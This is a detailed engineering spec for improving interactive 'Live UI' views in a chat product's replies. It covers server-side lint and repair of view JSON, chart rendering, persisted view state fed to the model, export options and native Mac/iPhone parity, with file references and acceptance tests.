# Live UI: verified, build-ready spec

Date: 31 October 2026. Area: Live UI, the interactive views inside chat answers (```live-ui fences). Repo: `/home/user/juno` at `parity-base` (e532983ea). The `improve/live-ui` branch is already merged.

This spec comes from a staff-level check of `depth/live-ui-audit.md`. I re-read every code claim in the repo (web, `native/`, server turn pipeline, Prisma) and re-fetched the Claude sources. ChatGPT pages on `help.openai.com` could not be fetched: the host is outside this session's network allow-list. Those claims rest on search excerpts of the official help article plus dated press coverage, and they are marked that way.

Work already being built elsewhere is not specified again here: share with specific people, per-chat memory off, AI-powered artifacts and storage, PDF/Docs/Slides export, locked chats, Drive/OneDrive attach, connectors in voice, tone sliders and the capability registry, MCP Apps `ui://` widgets, plugins, and the UI/motion redesign. Where an item touches that work, the touch point is named.

Sizes: **S** = 3 days or less, **M** = 1–2 weeks, **L** = 3 weeks or more. Impact: **H**, **M–H**, **M**.

---

## 0. Rules every item must follow

These rules apply to every item below. The repo already relies on all of them.

1. **Twin parsers.** `src/lib/live-ui/spec.ts` and `expr.ts` have Swift twins in `native/Packages/JunoNativeKit/Sources/JunoDesignSystem/LiveUI/` (`JunoLiveUISpec.swift`, `JunoLiveUIExpression.swift`). Both are held to `contracts/live-ui/fixtures/{spec,expr,json}.json`, run by `tests/live-ui.test.ts` and `LiveUIFixtureTests.swift`. Any new field, type or function lands in the fixtures first, then in both parsers, in the same PR.
2. **Prompt bytes are cached.** `LIVE_UI_SECTION` and `LIVE_UI_DO_SECTION` (`src/lib/chat/system-prompt.ts:154-204`, about 7.4k + 2.0k characters, roughly 2.4k tokens) sit in the cached stable tier. Each variant must be a constant, identical for every user with the same toggles (`tests/live-ui-prompt.test.ts`). Anything per turn or per user goes in the volatile tail (`src/lib/chat/turn-context-tail.ts`, `appendVolatileTail`), never in the system prompt.
3. **Clients opt in (INV-26).** A native build is never sent anything it has not declared in `clientFeatures`. See `src/lib/chat/client-features.ts`: shipped builds throw on unknown SSE frame types, and at most 16 features may be declared (9 are used today). The native list is in `NativeChatClientFeatures.declared` (`native/Packages/JunoNativeKit/Sources/JunoChatKit/NativeChatAPIClient.swift:2224-2228`).
4. **Content at rest is encrypted.** This covers any user-content column: use `encryptMessageText` / `decryptMessageTextSafe` (`src/lib/message-crypto.ts`). New user-content tables are added to the account export (`src/app/api/account/export/route.ts`) and cascade on account and message delete.
5. **Ownership in the query.** Every new route scopes by `conversation: { userId: user.id }`, as `src/app/api/messages/[id]/feedback/route.ts:27-30` does. A row from another account returns 404, not 403.
6. **Test runners.**
   - Unit: `tsx --test tests/*.test.ts`.
   - Browser: Playwright under `e2e/`, with the deterministic smoke provider (`src/lib/chat/turn/model-streams.ts:116`, which takes directives such as `SMOKE_ARTIFACT_DIRECTIVE`). A new directive is added per scripted reply.
   - Native: XCTest in `JunoDesignSystemTests`, including `LiveUISnapshotTests.swift`.

---

## 1. Ranked items

| Rank | ID | Title | Size | Impact | Depends on |
|---|---|---|---|---|---|
| 1 | LU-01 | Views that always render: server lint, fix-up and cheap repair before the reply is saved | M | H | none |
| 2 | LU-02 | Charts that read right (auto y-axis, new kinds, legend, chart-as-table, announced metrics) | M | H | none |
| 3 | LU-03 | The view keeps everything you did, and the model sees it | M | H | none |
| 4 | LU-04 | Keep a view: expand, copy as image, download, copy as text, save as artifact | M | H | none |
| 5 | LU-05 | Mac and iPhone draw every view the web draws | L | H | none (LU-01 recommended first) |
| 6 | LU-06 | Tap into any part of a view, and "Ask about this view" | S–M | M–H | none |
| 7 | LU-07 | Tables people can work with, and filtering inside a view | M | M–H | none |
| 8 | LU-08 | Update a view in place (identity, patches, cheaper history) | M | M–H | LU-01 |
| 9 | LU-09 | Same view state on every device | M | M | LU-03 |
| 10 | LU-10 | Visual-answers setting, chart accent and per-model gating | S | M | LU-01 (for gating only) |
| 11 | LU-11 | Drawn diagrams in the explorer (sanitised SVG figure) | M–L | M–H | LU-01 |
| 12 | LU-12 | Inline sandboxed visuals for simulations and games (`live-html`) | M–L | M–H | MCP Apps frame (in flight) |
| 13 | LU-13 | Views over real data: uploaded files and code-run output | L | M–H | LU-07 |
| 14 | LU-14 | Route maps for stops on Mac and iPhone (MapKit) | S–M | M | none |
| 15 | LU-15 | Real photos on cards, only from sources the turn fetched | M–L | M | LU-01 |

Ship first: the quick wins inside LU-02 (y-axis, labels, live region), LU-03 (LRU, document key) and LU-04 (copying a reply without JSON). Each takes a day or less.

---

## LU-01 Views that always render

**Size** M · **Impact** H

### Outcome
A reply never shows "This interactive view couldn't be shown", and never shows a headline figure of "–" because a formula names something that does not exist. A broken block is fixed before the reply is saved, so the fixed version is what appears on reload and on every device.

### Why it beats the competition
- Claude says visual quality "varies during the beta" (support.claude.com, 22 Apr 2026; fetched).
- OpenAI says it is still refining when Intelligent UI appears (press, 7–8 Oct 2026).

Neither promises a view that is checked before it is shown.

### Current code (verified)
- **Normalisation drops what it cannot draw, silently.**
  - `components()` skips non-records and unknown types (`spec.ts:402-419`).
  - `component()` returns `null` on every failed guard (`spec.ts:423-897`).
  - `LiveParse` carries only `error?: string` (`spec.ts:231-234`).
- **Fallback box.** `LiveUIFallback` (`src/components/chat/live-ui/live-ui-block.tsx:457-469`).
- **No server-side check.** Nothing in `src/lib/chat/turn/` reads Live UI fences.
- **Precedent for rewriting the reply before it is saved.** `prepareChatArtifactOutput(acc.text)` then `acc.replaceText(...)`. This runs in three places: `src/lib/chat/turn/run-turn.ts:1031-1033` (main path), `:1313` (second path) and `src/lib/chat/turn/private-turn.ts:405-406`.
- **The `done` frame already replaces the streamed text with the saved message.**
  - Web: `src/hooks/use-chat.ts:792-811` (`settleClientMessage(chunk.message)`).
  - Native: `NativeChatAPIClient.swift:1710-1722` (`.completed(... content: message.content)`).
- **No Live UI eval.** `bench/` holds only `workflows/`. Evals follow the pattern `scripts/eval-*.ts` + `src/lib/eval/*-cases.ts` (`npm run eval:research`).
- **No Live UI field in `TurnTrace`** (`src/lib/chat/turn/trace.ts:35-114`).

### Correction to the audit
The audit proposes a new SSE frame `live_ui_replace` gated by a new client feature `live_ui_repair`. **Neither is needed.** Run the repair before `persistAssistantTurn`, the way artifacts are prepared, and the existing `done.message.content` delivers the fixed text to web and to every native build already shipped.

Likewise there is no delivered message to rewrite later, so no revision row is needed: the streamed draft is never saved.

While the stream is running, the client keeps the last good partial view on screen (`live-ui-block.tsx:47-53`), so nothing flashes.

### Build
1. **`src/lib/live-ui/fences.ts`** (new, pure).
   - `findLiveUIFences(text): Array<{ index: number; start: number; end: number; bodyStart: number; bodyEnd: number; lang: string; source: string }>`.
   - Use `mdast-util-from-markdown`, which is already in `node_modules` through `react-markdown`; add it to `package.json` pinned. Walk `code` nodes whose `lang` passes `isLiveUIFence`. This gives exactly the fences `markdown.tsx` renders.
   - Skip text inside `<juno:artifact …>…</juno:artifact>` bodies, which artifact verification owns.
   - Splicing helper: `replaceFenceBodies(text, edits)`. It touches only `[bodyStart, bodyEnd)`, so prose is byte-identical.
2. **Report what normalisation dropped** (`spec.ts`).
   - Add an optional collector: `normalizeLiveUI(read, report?: LiveNormalizeReport)`.
   - `report.dropped.push({ key, type, reason })` wherever `component()` or `components()` returns `null` or skips.
   - Output must be unchanged: the fixtures stay green. No Swift change; this is server-side only.
3. **`src/lib/live-ui/lint.ts`** (new, pure). `lintLiveUI(source): { spec: LiveSpec | null; issues: LiveLintIssue[] }`, where `LiveLintIssue = { code; severity: "fatal" | "warn"; path: string; message: string }`. Codes:

   | Code | Severity | Rule |
   |---|---|---|
   | `json_syntax` | fatal | Includes the offset from `readLiveJSON` (`json.ts:57`) |
   | `too_large` | fatal | Over `LIVE_UI_MAX_SOURCE` (24,000) |
   | `not_object` | fatal | Root is not a JSON object |
   | `empty_view` | fatal | `ui` is empty after normalisation |
   | `dropped_component` | warn | Fatal when a top-level component is dropped |
   | `unknown_name` | warn | Free names from `parseExpr` (`expr.ts:125`, exported `Node`) checked against input ids, `let` keys, `data` keys, constants (`pi`, `e`, `true`, `false`, `null`), the chart `x.var`, and row fields (the keys of the first element of the evaluated `rows`). Fatal on an `emphasis` metric, a chart series, or a table's `rows`. |
   | `eval_null` | warn | Evaluated with `new LiveScope({ inputs: liveDefaults(spec), … })`. Fatal for an emphasis metric. |
   | `chart_empty` | fatal | No points |
   | `rows_not_list` | fatal | Table `rows` is not a list |
   | `let_cycle` | fatal | Cycle among `let` formulas |
   | `duplicate_id` | warn | Id used twice |
   | `near_cap` | warn | Over 19,200 characters |

4. **Deterministic fix-up first** (`lint.ts`, `fixLiveUISource`). Rerun lint after each step and stop when there are no fatal issues:
   - drop text after the root's closing brace;
   - remove `//` line comments outside strings;
   - straighten curly quotes used as JSON delimiters;
   - remove trailing commas;
   - escape a bare `"` inside a string when the bracket balance shows the string has not ended.
5. **`src/lib/live-ui/repair.ts`** (new, server-only). Used only if fatal issues remain.
   - **Call.** `runUtilityPrompt` (`src/lib/memory.ts:293`) with label `live_ui_repair`, `userId` (bills to the account), and the account's `loadBackgroundProviderPolicy` with `conversationProvider` set to the turn's provider. The repair may send content only where history compaction may (`src/lib/chat/turn/history.ts:64-71`).
   - **Input:**
     - the block;
     - the lint issues;
     - a fixed ~600-token schema digest: a new constant `LIVE_UI_REPAIR_DIGEST`, the component and field list from `LIVE_UI_SECTION`;
     - the 400 characters of prose before the fence.
   - **Output:** JSON only.
   - **Accept the result only if** fatal issues drop to 0, warnings do not grow, and the multiset of numeric literals under `data` and in input `value`/`min`/`max` is unchanged. The repair may fix structure and names, never numbers.
   - **Budget:** at most 2 blocks per message, 6 s wall clock in total, no retry.
   - **On failure:**
     - If the fix-up produced a parseable view, keep it.
     - Otherwise replace the fence with the view's text summary. Render it as a muted line plus the `liveUISummaryLines` text when a spec parsed (`src/lib/live-ui/summary.ts`). If nothing parsed, remove the fence; the prose already carries the answer (`LIVE_UI_SECTION`: "the reply stands without the view").
6. **Wiring.**
   - Add `prepareLiveUIOutput(text, { userId, provider, signal })`, returning `{ text, report }`.
   - Call it right after `prepareChatArtifactOutput` at `run-turn.ts:1031`, `run-turn.ts:1313` and `private-turn.ts:405`, then `acc.replaceText`.
   - Optional latency win: lint each fence the moment it closes in the stream (`pumpTurnStream`, `src/lib/chat/turn/run-stream.ts:44`) and start the repair promise early; await it at the call site above.
   - While a repair runs, `sendActivity({ kind: "write", title: "Checking the interactive view" })` so the activity row explains the short wait. Use `"write"`, an existing `ActivityKind` (`src/types/chat.ts:232`); do not add a new kind, which shipped native builds would not know.
   - Renew the durable receipt before saving, as today: `receipt.renew()` runs at `run-turn.ts:1058`.
7. **Telemetry.**
   - Add `liveUi: { views; fatalBefore; fixedDeterministic; repaired; failed; droppedComponents; chars } | null` to `TurnTrace` (`trace.ts`).
   - Fill it in `prepareLiveUIOutput`; `emitTurnTrace` already ships it.
   - The trace stores counts only, never text.
8. **Eval.** `src/lib/eval/live-ui-cases.ts` plus `scripts/eval-live-ui.ts` (`npm run eval:live-ui`), modelled on `scripts/eval-research-citations.ts`.
   - About 80 prompts:
     - positives: calculators, lessons from a pasted chapter, comparisons, recipes, trips, schedules, quizzes;
     - negatives: plain facts, chit-chat, "write me a React component".
   - System prompt: the real `buildSystemPromptSections({ liveUi: true, liveUiExercise: true, liveUiDo: true, … })`.
   - Run against every model `MODEL_LIST` can route to.
   - Score:
     - parse rate;
     - lint-clean rate before repair;
     - render rate after `prepareLiveUIOutput`;
     - trigger precision and recall;
     - view output tokens;
     - time to the closing fence.
   - Write `docs/rework/program/evidence/live-ui-eval-<date>.json`; LU-10 reads it.

### Security and privacy
- The repair sends view text to a model. It obeys the account's background-provider policy, so a "same provider only" account never has content walked to another provider.
- Repair output is model-written JSON and passes the same normaliser as any view.
- No numbers can change (multiset check).

### Acceptance tests
- `tests/live-ui-fences.test.ts`. A corpus of 30 replies covers nested fences, `~~~` fences, a fence inside a `juno:artifact` and an unclosed final fence. Offsets match what `react-markdown` renders.
- `tests/live-ui-lint.test.ts`. 25 broken fixtures each produce the expected code: unescaped quote, trailing prose, missing comma, `//` comment, unknown name in an emphasis metric, quiz answer out of range, chart `from > to` with a negative step, slider without an `id`, `let` cycle, rows not a list, smart quotes, trailing comma. Every block in `contracts/live-ui/samples.json` and `src/app/dev/live-ui/samples.ts` lints with zero fatal issues.
- `tests/live-ui-repair.test.ts`, with a stub `llm`:
  - a clean block never reaches the model;
  - prose outside fences is byte-identical;
  - a repair that changes a number in `data` is rejected and the summary fallback is used;
  - the 6 s budget is enforced with fake timers.
- Playwright `e2e/live-ui-repair.spec.ts`. A new smoke directive `SMOKE_LIVE_UI_BROKEN` streams a block with an unescaped quote and trailing prose. After `done` the view renders; after a reload it still renders; no "couldn't be shown" text appears anywhere.
- Eval gate: at least 97% of positive prompts render after `prepareLiveUIOutput` on the default model set, and the per-model table is written.

### Out of scope
Linting `interactive` blocks in DOCUMENT artifacts. Their zod schema (`src/lib/work/deliverables/semantic/document/model.ts:71-77`) already bounds them; a follow-up can call `lintLiveUI` there.

---

## LU-02 Charts that read right

**Size** M · **Impact** H

### Outcome
- A weight series running from 180 to 190 draws a line that visibly moves.
- Long category names are readable.
- New chart kinds: horizontal bars for long labels, stacked bars and areas, donuts for parts of a whole, and scatter.
- Clicking a legend entry hides that series.
- Every chart has a "View as table" toggle.
- A screen reader hears the headline figure change.

### Competitor evidence
- Claude builds charts in HTML, so it can draw any chart (support.claude.com, fetched).
- ChatGPT Intelligent UI shows "charts" (help-centre excerpt; press, 7 Oct 2026).

### Current code (verified)
- Kinds: `line | area | bar` only (`spec.ts:146,485-486`), with at most 4 series (`SPEC_LIMITS.chartSeries`, `spec.ts:24`).
- **Web y-axis always includes 0:** `yMin = Math.min(0, …)`, `yMax = Math.max(0, …)` (`src/components/chat/live-ui/live-ui-chart.tsx:145-146`).
- Category labels are cut at 14 characters (`:263`).
- The chart is `role="img"` (`:225`) and has an `aria-live` readout (`:203`). There is no table alternative and no legend toggle.
- A `Metric` has no live region (`live-ui-block.tsx:294-305`).
- Native uses Swift Charts `BarMark`/`AreaMark`/`LineMark` with default y-scale and hidden legend (`JunoLiveUIParts.swift:179-221`).

### Correction to the audit
A zero baseline is correct for bars and areas: bar length must encode the value. Only **line** charts (and scatter) should get an automatic domain. The audit's "no forced 0 baseline" must not apply to bars.

### Build
1. **Spec** (`spec.ts` + `JunoLiveUISpec.swift` + `fixtures/spec.json`), chart fields:
   - `kind`: `line | area | bar | scatter | donut`. Aliases: `pie → donut`, `column → bar`, `points → scatter`.
   - `orient`: `"h"` for bars only.
   - `stack`: boolean, for bar and area.
   - `zero`: `"auto" | true | false`. Default: `"auto"`, which means `true` for bar, area and donut and `false` for line and scatter.
   - Per series: `axis: "right"` (at most one right-axis series) and `kind: "line" | "bar"` (a combined chart only when the root kind is `bar`).
   - Series limit 4 → 6. Still one accent; the rest use the existing dash patterns.
   - Donut takes `rows` + `xKey` (slice label) + one series (value). Negative values are dropped, and the drop is flagged by LU-01 lint.
2. **Web** (`live-ui-chart.tsx`):
   - When `zero` resolves to false, use `niceTicks(min(all), max(all))` and keep a 4% pad.
   - Label width from measured `plotW / n` instead of `slice(0, 14)`. Horizontal bars put labels on the y side, so nothing truncates under 40 characters.
   - Stacking: prefix sums per x.
   - Donut: SVG arcs and centre total, with percentages that sum to 100 using the largest-remainder method.
   - Scatter: circles, downsampled above 400 points by uniform stride.
   - Legend becomes buttons with `aria-pressed`.
   - "View as table" toggle: a `<table>` with the same formatted values.
3. **Metric live region** (`live-ui-block.tsx` `Metric`): an emphasis metric gets an `sr-only` `aria-live="polite"` twin, updated 500 ms after the value settles, not on every tween frame.
4. **Native** (`JunoLiveUIParts.swift`):
   - `.chartYScale(domain: .automatic(includesZero: zero))`;
   - `SectorMark(angle:innerRadius: .ratio(0.6))` for donut;
   - `PointMark` for scatter;
   - `stacking: .standard` for stack;
   - swapped x/y for `orient: "h"`;
   - legend shown and tappable through `chartForegroundStyleScale` with a hidden-series set;
   - an `accessibilityChartDescriptor` (AXChartDescriptor) so VoiceOver gets the audio graph and the data table.
5. **Prompt.** About 120 characters added to the Outputs line of `LIVE_UI_SECTION`: "chart (kind line|area|bar|scatter|donut; orient "h" for long labels; stack; zero false for lines that do not start near 0)". No new example. Update the cache test fixture.

### Acceptance tests
- `fixtures/spec.json` covers the new fields, aliases and the series cap of 6; TS and Swift pass.
- `tests/live-ui-render.test.ts`:
  - a line series of 180–190 gets a y-domain between 178 and 192;
  - a bar series of 180–190 keeps 0;
  - a donut's labelled percentages sum to 100;
  - a 30-character category label renders in full in horizontal mode.
- Legend: toggling series 2 removes its path, and `aria-pressed` flips.
- axe-core over `/dev/live-ui` passes. "View as table" exposes a `<table>` with headers.
- Native snapshot tests in light and dark at iPhone and Mac width for the five kinds.
- Perf: dragging a slider over 4 series × 400 points stays under 16 ms per frame in the `/dev/live-ui` harness (Chrome performance trace, p95).

---

## LU-03 The view keeps everything you did, and the model sees it

**Size** M · **Impact** H

### Outcome
- A half-finished quiz, the step you reached, recipe servings and ticks, flashcards marked known, the open tab and an exercise draft all survive a reload and scrolling far back in a long chat. Today only slider values and checklist ticks do.
- After moving the tip slider to 15% and typing "what if we were 6?", the model answers with 15% without being told.

### Competitor evidence
- ChatGPT: "Checklists can keep their state when you refresh a chat thread; state does not carry over between threads" (help-centre excerpt).
- Claude: visuals are "ephemeral by default" (fetched).
- Neither documents the model seeing what the reader set. That would be a lead for Alevr.

### Current code (verified)
- **Stored today.** `StoredLiveState` has only `v` (inputs), `c` (checklists) and `p` (picks) (`src/components/chat/live-ui/use-live-state.ts:43-47`). It lives in localStorage under `live-ui:v1:<messageId>:<fnv(source)>` (`spec.ts:1092-1094`), saved with a 300 ms debounce (`:136-149`).
- **Never stored** (local React state only):
  - steps `active`/`reached` (`live-ui-learning.tsx:132-133`);
  - quiz `current`/`answers`/`done` (`:291-293`);
  - exercise draft/`shown`/`sent` (`:536-538`);
  - recipe `servings`/`have`/`done`/timers (`live-ui-intelligent.tsx:104-107`);
  - tabs `active` (`:528`);
  - flashcards `index`/`known` (`:580-582`);
  - explorer selection (`live-ui-parts.tsx:29`).
- **Lost by windowing.** The transcript windows from 24 messages (`src/hooks/use-transcript-window.ts:21`), so these unmount and reset.
- **Native.** UserDefaults stores `v` and `c` only, with no picks (`JunoLiveUIView.swift:165-208`).
- **Unbounded keys.** Neither store evicts anything.
- **Shared key in documents.** A DOCUMENT `interactive` block renders without a message id (`src/components/semantic/document-view.tsx:148`), so every document with the same view shares the key `live-ui:v1:-:<hash>`.
- **The model never sees reader state.** History passes old fences through verbatim at their defaults (`src/lib/chat/turn/history.ts:77-78`). The only path is a button prompt that interpolates `{{expr}}`.

### Correction to the audit
The model-visible note does **not** need the server table that the audit bundled with it. The client already holds the state, so it sends it with the request and the server checks it against the stored message. That makes this item independent of cross-device sync (LU-09), which ships after it.

### Build
1. **Lift all component state into `useLiveState`.** Extend `StoredLiveState` with these keys, each keyed by component `key`:

   | Key | State |
   |---|---|
   | `q` | quiz: `{ i: current, a: (number\|null)[], d: boolean }` |
   | `s` | steps: `{ a: active, r: reached }` |
   | `r` | recipe: `{ n: servings, h: number[], d: number[] }` |
   | `f` | flashcards: `{ i, k: number[] }` |
   | `t` | tabs: active index |
   | `x` | exercise: `{ draft ≤ 4000 chars, shown, sent }` |
   | `e` | explorer: selected id |

   - `restoreLiveState` validates each key against the current spec, as it does today for `v`/`c`/`p`: index bounds, same component type, option counts.
   - Components receive value plus setter props instead of `React.useState`.
   - Recipe timers are not persisted: a running timer survives only as long as the component stays mounted.
   - `reset` clears everything except `p` and `x.sent`. A sent answer stays sent.
2. **Swift twin.** `JunoLiveUIView.swift` gets the same keys, and its learning views read and write through the context. Store `p` (picks) too.
3. **LRU** on both platforms. A `live-ui:index` entry keeps the last 500 keys by last write; older keys are removed on write. All access is wrapped in try/catch, as today.
4. **Document key.** `LiveUIBlock` takes an optional `storageScope` prop. `document-view.tsx` passes `doc:<artifactId>:<blockId>` and the MARKDOWN artifact renderer passes `art:<artifactId>:<fenceIndex>`. `liveStorageKey(scope ?? messageId, source)`.
5. **State reaches the model.**
   - **Client:**
     - `use-chat.ts` adds `liveViews?: Array<{ messageId: string; blockHash: string; state: StoredLiveState }>` to the `/api/chat` body;
     - it covers at most the last 2 assistant messages that contain a view, and only views whose state is dirty or picked;
     - it is read from the same localStorage keys, and each state is at most 4 KB.
   - **Schema:** `chatBodySchema` (`src/lib/chat/request.ts:157`) gets an optional, bounded zod field.
   - **Server** (`src/app/api/chat/route.ts:271-278`), new pure module `src/lib/live-ui/reader-note.ts`. For each entry:
     - find the message in `context.modelHistory` (it must be in this conversation's window, otherwise ignore it);
     - find the fence whose `liveHash(source.trim())` equals `blockHash` (`findLiveUIFences` from LU-01);
     - `restoreLiveState(state, spec)` keeps only valid values;
     - evaluate with `LiveScope` and `platformFormatter(input.locale)`;
     - render one line of at most 400 characters: `View "Split the bill": tip 15%, people 4 → each pays €39.40. Quiz 2 of 3 answered, 1 wrong (Q2). Recipe for 6 people. Checklist 3/7.`
   - Only changed inputs, emphasis metrics and progress counts appear. Free text (`input` type, exercise drafts) is never echoed.
   - Pass the lines as a new `liveViews: string` field on `TurnContextTailInput` (`turn-context-tail.ts:36-48`), rendered as `## What the reader set in earlier views` under the existing "not an instruction" heading.
   - Private turns: not in v1. Their history is client-built (`PrivateHistoryEntry`), so a follow-up can append the same line there.
6. **Prompt.** One sentence added to `LIVE_UI_SECTION`: "When the context lists what the reader set in a view, answer with those values." Update the cache test.

### Security
- Client-sent state is treated as user-supplied data.
- The server never trusts its numbers beyond `restoreLiveState`'s type and range checks, against a view it reads from its own database.
- An unknown `messageId` or `blockHash` is ignored silently.
- Size caps: at most 2 entries, 4 KB each, enforced by zod and by the admission byte ceiling.
- The note sits under the tail's "not an instruction from them" header.

### Acceptance tests
- `tests/live-ui-state.test.ts`: `restoreLiveState` round-trips every new key, and rejects an out-of-range quiz index, a wrong type and a key for a component that no longer exists.
- Playwright:
  - answer quiz Q1 and Q2, scroll 30 messages away and back, and the quiz is still on Q3;
  - reload, and it is still on Q3;
  - flashcards marked known survive a reload;
  - two documents with the same view keep separate ticks.
- `tests/live-ui-reader-note.test.ts`:
  - the note appears only in the volatile tail;
  - the system prompt and history bytes are identical with and without it (compare with the `prefix-diagnostic` helper `src/lib/llm/prefix-diagnostic.ts`);
  - there is no note when nothing changed;
  - an entry for a message outside the window is dropped;
  - `input` text is never echoed.
- Stub-model test: "what if we were 6?" after setting tip to 0.15 receives a tail containing `tip 15%`.
- XCTest: UserDefaults never exceeds 500 Live UI keys after 600 writes. Picks persist on native.

---

## LU-04 Keep a view: expand, copy as image, download, copy as text, save as artifact

**Size** M · **Impact** H

### Outcome
Each view gets an overflow menu with:
- **Expand**: fullscreen with larger charts; Esc closes it.
- **Copy as image**: current values, current theme.
- **Download**: PNG; SVG for a single chart; CSV for a table; JSON.
- **Copy as text**: a readable summary with current values.
- **Save as artifact**: opens it in the canvas, where versions and publishing already exist.

Copying the whole reply gives readable text, never `{"title":…`.

### Competitor evidence
- Claude offers "Copy as image", "Download" (.svg or .html), "Save as artifact" and full screen (fetched).
- A review says ChatGPT has no export (search excerpt; low confidence).

### Current code (verified)
- **Header.** The view header has only Reset (`live-ui-block.tsx:84-106`).
- **Reply copy.** It copies `stripMemoryTags(view.content)` with fences intact (`src/components/chat/message-item.tsx:971`); this is a known gap (`docs/design/LIVE_UI.md` §11).
- **Summary helper.** `liveUISummaryLines(spec)` exists (`src/lib/live-ui/summary.ts:15`). It skips inputs and charts, and has no Swift twin.
- **Native copy.** It uses the raw text: `UIPasteboard.general.string = plainText` (`JunoMobileConversationsView.swift:2761`) and `ChatCommands.swift:227` on Mac.
- **No server-side create route.** Artifact rows are created only by turn persistence, duplicate (`src/lib/artifact-duplicate.ts:59`) and design (`src/app/api/design/route.ts:85`).
- **`data-chart-block.tsx`** already has an Expand/Download pattern for code-run images (`src/components/chat/data-chart-block.tsx:20-35`).

### Build
1. **`summary.ts`.** Add `liveUISummaryWithState(spec, scope, formatter, currency): string[]`, covering:
   - changed inputs (`Tip: 15%`);
   - metrics with current values;
   - tables as Markdown tables (at most 50 rows);
   - charts as `Title: first → last (min–max)`.

   `liveUISummaryLines` stays as it is for document export.
2. **Reply copy** (`message-item.tsx:971`). Use a pure `contentForCopy(content, states)` in `src/lib/live-ui/copy.ts` that replaces each live-ui fence (`findLiveUIFences`) with its summary, reading current state from localStorage keys.
3. **Menu** (`live-ui-block.tsx` header). It uses the shared `DropdownMenu` and is always present once the view is not streaming.
   - **Expand** uses the app's `Dialog`.
   - **Copy as image:**
     - Single chart: serialise its `<svg>` with computed CSS variables inlined, then draw it on a canvas.
     - Whole card: a DOM rasteriser. Add `html-to-image` (MIT), pinned exactly and loaded with dynamic `import()`, after `document.fonts.ready`.
     - Output is `ClipboardItem({"image/png"})`, with a download fallback where clipboard images are refused.
     - Views have no remote images today. LU-15 must route through its same-origin proxy so rasterising never taints the canvas.
   - **Download CSV** for a table: the formatted cells, RFC 4180 quoting, with formulas neutralised (`=`, `+`, `-` and `@` at cell start prefixed with `'`).
4. **Save as artifact.** New `POST /api/messages/[id]/live-view/artifact` with body `{ fenceIndex: number }`.
   - Owner-scoped load: `role: "ASSISTANT"`, `conversation.userId`.
   - The server extracts the fence itself (`findLiveUIFences`) and never accepts client-sent source.
   - It creates a MARKDOWN artifact in the conversation (`conversationId`, `messageId`, title = spec title or "Interactive view"), through the same helper turn persistence uses (`persistArtifacts`, `src/lib/artifacts-store.ts:272`, as called in `src/lib/chat/turn/finalize.ts:146`). Content = the paragraph before the fence + the fence.
   - It returns the serialised artifact, and the client opens the canvas.
   - Current state is copied into localStorage under the artifact's `storageScope` (LU-03), so the artifact opens with the same values.
   - The AI-powered-artifact work in flight takes over from there; do not build storage here.
5. **Native.**
   - A context menu on `JunoLiveUIView` with:
     - Copy as image: `ImageRenderer` on the view at `displayScale`, in the current colour scheme;
     - Share: `ShareLink` with the PNG;
     - Copy as text;
     - Save as artifact: same route through `NativeChatAPIClient`.
   - New `JunoLiveUISummary.swift`, twin of `liveUISummaryWithState`, held to a new `contracts/live-ui/fixtures/summary.json`.
   - Native reply copy uses it.

### Security
- Save as artifact reads only the caller's own message.
- CSV formulas are neutralised.
- The rasteriser runs in the page context on the user's own DOM.

### Acceptance tests
- `tests/live-ui-copy.test.ts`: a reply with two views copies to text containing no `{"title"` and containing `Tip: 15%` after state is set.
- The CSV equals the rendered cells (formatted). A cell `=SUM(A1)` exports as `'=SUM(A1)`.
- Playwright:
  - Expand opens a dialog; Esc closes it and focus returns to the menu trigger;
  - Copy as image yields a PNG whose size matches the card;
  - pixel-diff smoke in light and dark;
  - Save as artifact opens the canvas with a MARKDOWN artifact that renders the same view with the same slider value;
  - the route returns 404 for another account's message id, and 400 for a `fenceIndex` out of range.
- XCTest: `summary.json` fixtures pass. `ImageRenderer` output is non-empty for every contract sample.

### Dropped from the audit
"Share with my adjusted values" (a `liveStates` snapshot on `Share`). It is low value, and it collides with the share-with-specific-people migration on the same `Share` model (`prisma/schema.prisma:2493`). Revisit after that ships.

---

## LU-05 Mac and iPhone draw every view the web draws

**Size** L · **Impact** H

### Outcome
On the Mac and iPhone:
- A recipe, comparison, set of choices, card gallery, tabs or flashcards made on any device works.
- Servings use a native `Stepper`.
- Choices send with a tap.
- The recommended option sits on Liquid Glass.

A type a build does not know shows a one-line "Update Alevr to see this view" row, never an empty frame.

### Competitor evidence
- Claude visuals "don't render on Claude for iOS or Claude for Android" (fetched).
- ChatGPT: "web and supported updated apps" (help-centre excerpt). Full native coverage puts Alevr ahead of Claude and at parity with ChatGPT.

### Current code (verified)
- **Six types missing in Swift.** The `LiveComponent` enum lacks `recipe`, `choices`, `compare`, `cards`, `tabs` and `flashcards` (`JunoLiveUISpec.swift:238-255`). Unknown types return `nil` (`:726-727`).
- **Empty frame.** A view whose only component is one of these renders as title plus two hairlines (`JunoLiveUIView.swift:113-152`).
- **Native is never taught them.** The section is gated with `liveUiDo: legacyChatClientForOrigin(input) === "web"` (`src/lib/chat/turn/prompt.ts:129`, `private-turn.ts:162`).
- **Web-only samples.** The intelligent samples live in `src/app/dev/live-ui/samples.ts:115-120` "until the native renderers draw these types".
- **iOS fills the composer instead of sending.** `JunoLiveUIHost(onPrompt: { prompt = $0 }, onSend: …)` (`JunoMobileConversationsView.swift:1146-1152`). This is documented as deliberate (`LIVE_UI.md` §11). Mac sends (`DesktopChatWorkspace.swift:2459-2460`), and so does the web (`chat-view.tsx:2117-2120`).
- **No picks on native.** Native persists no picks (`JunoLiveUIView.swift:165-208`).

### Corrections to the audit
- **No placeholder on the web.** The web is deployed with the server, so an unknown type there is a model invention, and showing "Update Alevr" for it would be wrong. The web keeps dropping it, and LU-01 lint removes it before saving. The placeholder is **native-only**. Because LU-01 strips invented types before saving, a native placeholder appears only for genuinely newer types.
- **No undo toast.** Mac and web have none. iOS simply sends, like them.

### Build
1. **Swift parser.** Add cases mirroring `spec.ts:750-886`: limits, aliases (`ingredients`, `versus`, `gallery`, `deck`, …) and id defaults (`recipe_<key>`).
   - Add `case unsupported(key: String, type: String, title: String?)` for an unknown `type` string that is a valid identifier, but **not** for aliases or layouts.
   - Fixtures: add the six types to `contracts/live-ui/fixtures/spec.json` in the same PR, and run them in both parsers.
2. **`JunoLiveUIIntelligent.swift`** (new):
   - Recipe:
     - `Stepper` for servings, scaling quantities with the same rounding as `live-ui-intelligent.tsx`;
     - ingredient and step checkmarks;
     - per-step timers via `TimelineView(.periodic)`;
     - optional iOS local notification: `UNUserNotificationCenter`, asked only when the person first taps "Notify me", and cancelled when the timer is stopped.
   - Choices: tap sends through `context.onSend`; multi-select shows a Send button; locks on pick.
